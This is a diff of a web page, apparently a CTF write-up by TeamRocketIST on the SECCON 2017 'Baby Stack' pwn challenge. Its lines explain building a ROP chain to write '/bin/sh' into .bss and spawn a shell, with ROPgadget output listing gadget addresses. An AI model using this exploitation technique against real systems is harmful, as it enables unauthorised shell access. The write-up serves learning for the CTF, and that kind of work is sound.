@@ -17,7 +17,7 @@
   
   <title>[Pwn] SECCON - Baby Stack | TeamRocketIST - Portuguese CTF Team</title>
   <meta name="description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
-<meta name="keywords" content="rop,stack_overflow,pwn,seccon2017,go,statically_linked">
+<meta name="keywords" content="stack_overflow,pwn,rop,go,statically_linked,seccon2017">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[Pwn] SECCON - Baby Stack">
 <meta property="og:url" content="https://teamrocketist.github.io/2017/12/13/Pwn-SECCON-Baby-Stack/index.html">
@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://i.imgur.com/0kyUAPc.png">
 <meta property="og:image" content="https://i.imgur.com/HEuxv0i.png">
 <meta property="og:image" content="https://i.imgur.com/VtO8xjO.png">
-<meta property="og:updated_time" content="2017-12-13T16:18:59.873Z">
+<meta property="og:updated_time" content="2017-12-13T19:25:09.091Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[Pwn] SECCON - Baby Stack">
 <meta name="twitter:description" content="Baby StackCan you do a traditional stack attack?Host : baby_stack.pwn.seccon.jpPort : 15285baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8  Overflow the BufferWe have a go">
@@ -371,7 +371,7 @@
         
 		
 	
-		<span class="post-wordcount hidden-xs">Word Count: 2,315 (words)</span>
+		<span class="post-wordcount hidden-xs">Word Count: 2,312 (words)</span>
 	
 	
 		<span class="post-readcount hidden-xs">Read Time: 14 (min)</span>
@@ -410,7 +410,7 @@
 <p>Where <strong><code>RAX</code></strong> is the system call number and <strong><code>RDI</code></strong> must have an address that points into <strong>‘/bin/sh’</strong> the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets.</p>
 <h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/VtO8xjO.png" alt=""><br></a></p>
 <p><strong>.bss</strong> is perfect its address doesn’t change on different runs because <strong><code>PIE</code></strong> protection isn’t enabled, and as the picture above says in IDA we have <strong><code>read</code></strong> and <strong><code>write</code></strong> permissions which is what we want.</p>
-<p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong> for example and with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPGadgets</a>, if we have a 64bit MOV:</p>
+<p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong>, with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPGadgets</a>, if we have a 64bit MOV:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'mov qword ptr \[rdi\], '</span></div><div class="line">0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</div><div class="line">0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</div><div class="line">0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret</div><div class="line">0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</div><div class="line">0x0000000000456499 : mov qword ptr [rdi], rax ; ret</div><div class="line">0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</div></pre></td></tr></table></figure>
 <p>There we go, the <strong><code>mov qword ptr [rdi], rax ; ret</code></strong> is the gadget we need! we just need to store the .bss address into <strong><code>RDI</code></strong>, and the string <strong>/bin/sh</strong> into <code>RAX</code>, to store them into <strong><code>RDI</code></strong> and <strong><code>RAX</code></strong> we need gadgets like <strong><code>POP RDI ; RET</code></strong> and <strong><code>POP RAX ; RET</code></strong>, this gadgets will get the value on the top of the stack and store it in the respective register that’s what <strong><code>POP</code></strong> does:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rdi ;'</span></div><div class="line">0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret</div><div class="line">0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret</div><div class="line">0x0000000000429eea : pop rdi ; call 0x401008</div><div class="line">0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret</div><div class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rax ; ret'</span></div><div class="line">0x00000000004016ea : pop rax ; ret</div><div class="line">0x0000000000429283 : pop rax ; ret 0xf66</div></pre></td></tr></table></figure>
